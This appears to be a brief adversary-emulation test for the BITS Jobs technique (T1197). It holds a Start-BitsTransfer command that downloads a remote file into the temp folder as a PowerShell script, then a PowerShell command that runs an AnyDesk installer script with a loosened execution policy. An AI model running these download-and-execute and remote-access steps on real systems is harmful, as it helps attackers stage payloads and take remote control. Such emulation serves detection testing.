# T1197 - Bits Job 
Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1

Powershell.exe -executionpolicy remotesigned -File .\anydeskInstall.ps1